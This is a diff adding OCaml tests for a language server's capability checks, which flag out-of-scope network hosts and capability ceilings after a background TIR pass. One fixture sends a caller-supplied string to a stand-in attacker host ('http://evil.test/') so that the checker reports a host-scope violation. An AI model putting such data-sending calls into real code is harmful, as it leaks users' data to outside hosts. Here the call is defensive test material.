@@ -1423,3 +1423,73 @@ let test_no_alloc_candidates_are_this_file_only () =
   Alcotest.(check bool) "no stdlib or dependency function is a candidate" true
     (List.for_all (fun (_, (sp : Ast.span), _, _) -> sp.Ast.file = a.An.filename)
        a.An.no_alloc_candidates)
+
+(* ------------------------------------------------------------------ *)
+(* Capability checks in the editor (ocap phase 3)                      *)
+(* ------------------------------------------------------------------ *)
+
+let cap_codes (a : An.t) =
+  List.filter_map (fun (d : Lsp.Types.Diagnostic.t) ->
+      match d.code with
+      | Some (`String c) when String.length c >= 4 && String.sub c 0 4 = "cap_" ->
+        Some (match String.index_opt c ':' with
+            | Some i -> String.sub c 0 i
+            | None -> c)
+      | _ -> None) a.An.diagnostics
+
+let ceiling_stdlib_src = {|
+mod Main do
+  needs IO.Console, IO.FileRead
+  mod Dep do
+    needs IO.Console
+    fn slurp(p : String) : String do
+      match File.read(p) do
+        Ok(s) -> s
+        Err(_) -> "none"
+      end
+    end
+  end
+  fn main(c : Cap(IO.Console), f : Cap(IO.FileRead)) do
+    println(Dep.slurp("/nonexistent"))
+  end
+end
+|}
+
+let host_scope_src = {|
+mod Main do
+  needs IO.NetConnect, IO.Console
+  mod A do
+    needs IO.NetConnect("example.com")
+    fn go(q : String) : String do
+      match HttpTransport.simple_get("http://evil.test/" ++ q) do
+        Ok(_) -> "ok"
+        Err(_) -> "err"
+      end
+    end
+  end
+  fn main(_n : Cap(IO.NetConnect), _c : Cap(IO.Console)) do
+    println(A.go("q"))
+  end
+end
+|}
+
+(** The stdlib-mediated ceiling, as `march --check` reports it: from the
+    background TIR pass (the edit-time incremental check runs no module-end
+    capability checks: specs/todos/2026-11-10-lsp-module-end-capability-checks.md). *)
+let test_tir_pass_reports_stdlib_mediated_ceiling () =
+  let a = analyse ceiling_stdlib_src in
+  Alcotest.(check (list string)) "nothing before the TIR pass" [] (cap_codes a);
+  Alcotest.(check (list string)) "cap_ceiling after it" [ "cap_ceiling" ]
+    (cap_codes (An.run_tir_pass a))
+
+(** Host scopes are judged on lowered TIR: the background TIR pass. *)
+let test_tir_pass_reports_host_scope () =
+  let a = analyse host_scope_src in
+  Alcotest.(check (list string)) "nothing before the TIR pass" [] (cap_codes a);
+  Alcotest.(check (list string)) "cap_host_scope after it" [ "cap_host_scope" ]
+    (cap_codes (An.run_tir_pass a))
+
+(** Running the pass twice publishes the finding once. *)
+let test_tir_pass_does_not_duplicate_ceiling () =
+  Alcotest.(check (list string)) "one cap_ceiling" [ "cap_ceiling" ]
+    (cap_codes (An.run_tir_pass (An.run_tir_pass (analyse ceiling_stdlib_src))))
